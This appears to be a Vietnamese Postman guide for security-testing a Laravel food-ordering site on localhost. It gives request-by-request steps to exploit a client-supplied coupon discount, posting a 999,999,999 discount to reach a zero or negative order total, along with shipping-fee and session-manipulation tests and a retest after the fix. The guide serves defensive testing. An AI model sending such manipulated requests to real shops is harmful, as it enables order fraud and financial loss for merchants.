# HƯỚNG DẪN TEST BẢO MẬT BẰNG POSTMAN

## 🎯 **SETUP POSTMAN ENVIRONMENT**

### 1. Tạo Environment Variables
```
BASE_URL: http://localhost:8000 (hoặc domain của bạn)
CSRF_TOKEN: (sẽ được extract từ response)
SESSION_COOKIE: (sẽ được extract từ login)
```

### 2. Setup Pre-request Scripts
```javascript
// Extract CSRF token from HTML
if (pm.response.text().includes('csrf-token')) {
    const token = pm.response.text().match(/name="csrf-token" content="([^"]+)"/);
    if (token) {
        pm.environment.set("CSRF_TOKEN", token[1]);
    }
}
```

## 🚨 **TEST CASE 1: DISCOUNT MANIPULATION VULNERABILITY**

### Step 1: Login và lấy session
```http
POST {{BASE_URL}}/customer/login
Content-Type: application/x-www-form-urlencoded

email=test@example.com&
password=password123&
_token={{CSRF_TOKEN}}
```

**Response cần lấy:**
- Set-Cookie header để lưu session
- CSRF token mới

### Step 2: Thêm sản phẩm vào giỏ
```http
POST {{BASE_URL}}/cart/add
Content-Type: application/json
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

{
    "variant_id": 1,
    "quantity": 2,
    "toppings": []
}
```

### Step 3: **EXPLOIT - Apply Malicious Discount**
```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

{
    "coupon_code": "FASTFOOD10",
    "discount": 999999999
}
```

**⚠️ Expected Vulnerability:**
- Server sẽ accept discount 999,999,999đ
- Lưu vào session mà không validate

### Step 4: Verify Discount Applied
```http
GET {{BASE_URL}}/checkout
Cookie: laravel_session={{SESSION_COOKIE}}
```

**Response sẽ hiển thị:**
- Discount: -999,999,999đ
- Total có thể âm!

### Step 5: **CRITICAL - Complete Malicious Checkout**
```http
POST {{BASE_URL}}/checkout/process
Content-Type: application/x-www-form-urlencoded
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

full_name=Test User&
phone=0123456789&
email=test@example.com&
address=123 Test Street&
city=Hà Nội&
district=Ba Đình&
ward=Phúc Xá&
payment_method=cod&
terms=on
```

**⚠️ CRITICAL RESULT:**
- Order được tạo với discount 999M
- Total amount có thể = 0 hoặc âm
- **FINANCIAL LOSS!**

## 🔍 **TEST CASE 2: SHIPPING FEE INCONSISTENCY**

### Test Frontend Calculation
```http
GET {{BASE_URL}}/checkout
Cookie: laravel_session={{SESSION_COOKIE}}
```

**Analyze HTML Response:**
```php
// Tìm dòng này trong response
$shipping = $subtotal > 100000 ? 0 : 15000;
```

### Test Backend Calculation
```http
POST {{BASE_URL}}/checkout/process
Content-Type: application/x-www-form-urlencoded
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

# Với subtotal = 150,000 (giữa 100k và 200k)
```

**Expected Inconsistency:**
- Frontend: Hiển thị "Miễn phí" (> 100k)
- Backend: Charge 25,000đ (< 200k)

## 🧪 **TEST CASE 3: SESSION MANIPULATION**

### Test 1: Direct Session Modification
```javascript
// Pre-request script để modify session data
const sessionData = pm.environment.get("SESSION_COOKIE");
// Attempt to decode and modify session
```

### Test 2: Multiple Discount Applications
```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

{
    "coupon_code": "FASTFOOD10",
    "discount": 50000
}
```

```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

{
    "coupon_code": "FASTFOOD10",
    "discount": 100000
}
```

**Test Result:** Discount có bị overwrite hay accumulate?

## 📊 **POSTMAN COLLECTION STRUCTURE**

```
Security Testing Collection/
├── 1. Authentication/
│   ├── Get CSRF Token
│   ├── Customer Login
│   └── Admin Login
├── 2. Normal Flow/
│   ├── Add to Cart
│   ├── View Cart
│   ├── Apply Valid Coupon
│   └── Normal Checkout
├── 3. Security Tests/
│   ├── 🚨 Discount Manipulation
│   ├── 🚨 Shipping Inconsistency
│   ├── 🚨 Session Manipulation
│   ├── SQL Injection Tests
│   └── XSS Tests
└── 4. Edge Cases/
    ├── Empty Cart Checkout
    ├── Invalid Payment Method
    └── Concurrent Requests
```

## 🔧 **ADVANCED POSTMAN SCRIPTS**

### Auto-Extract Values
```javascript
// Test script để extract values
pm.test("Extract session and tokens", function () {
    // Extract CSRF token
    const html = pm.response.text();
    const csrfMatch = html.match(/name="csrf-token" content="([^"]+)"/);
    if (csrfMatch) {
        pm.environment.set("CSRF_TOKEN", csrfMatch[1]);
    }
    
    // Extract session cookie
    const cookies = pm.response.headers.get("Set-Cookie");
    if (cookies) {
        const sessionMatch = cookies.match(/laravel_session=([^;]+)/);
        if (sessionMatch) {
            pm.environment.set("SESSION_COOKIE", sessionMatch[1]);
        }
    }
});
```

### Validate Vulnerability
```javascript
pm.test("🚨 VULNERABILITY: Discount Manipulation", function () {
    const jsonData = pm.response.json();
    
    // Kiểm tra server có accept discount không hợp lệ
    if (jsonData.success === true && jsonData.discount > 1000000) {
        pm.test("CRITICAL: Server accepts malicious discount", function() {
            pm.expect(false).to.be.true; // Fail test để highlight vulnerability
        });
    }
});
```

### Monitor Financial Impact
```javascript
pm.test("Monitor Order Total", function () {
    const response = pm.response.text();
    const totalMatch = response.match(/Tổng cộng.*?(\d{1,3}(?:\.\d{3})*|\d+)/);
    
    if (totalMatch) {
        const total = parseInt(totalMatch[1].replace(/\./g, ''));
        
        if (total <= 0) {
            console.log("🚨 CRITICAL: Order total is zero or negative!");
            pm.environment.set("FINANCIAL_IMPACT", "CRITICAL");
        }
    }
});
```

## 📋 **TEST EXECUTION CHECKLIST**

### Pre-Testing
- [ ] Setup local environment
- [ ] Clear all caches
- [ ] Fresh database seed
- [ ] Enable Laravel debugging

### During Testing
- [ ] Monitor Laravel logs
- [ ] Check database changes
- [ ] Verify session storage
- [ ] Monitor network traffic

### Post-Testing
- [ ] Document all vulnerabilities
- [ ] Calculate financial impact
- [ ] Prioritize fixes
- [ ] Create fix timeline

## 🎯 **EXPECTED RESULTS**

### Successful Exploit Indicators:
```json
// Response từ malicious discount apply
{
    "success": true,
    "message": "Áp dụng mã giảm giá thành công", 
    "discount": 999999999
}
```

### Database Evidence:
```sql
-- Kiểm tra orders table
SELECT order_number, subtotal, discount_amount, total_amount 
FROM orders 
WHERE discount_amount > 100000;
```

### Log Evidence:
```
[2024-01-XX XX:XX:XX] Order created with suspicious discount:
Order ID: ORD-XXXXXX
Discount Applied: 999,999,999đ
Final Total: -999,899,999đ
```

## 🛡️ **DEFENSIVE TESTING**

Sau khi fix vulnerabilities, test lại:

```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json
X-CSRF-TOKEN: {{CSRF_TOKEN}}

{
    "coupon_code": "FASTFOOD10", 
    "discount": 999999999
}
```

**Expected Fixed Response:**
```json
{
    "success": false,
    "message": "Invalid discount amount"
}
```

---

**💡 TIP:** Sử dụng Postman Monitor để tự động chạy security tests định kỳ và alert khi có vulnerability mới! 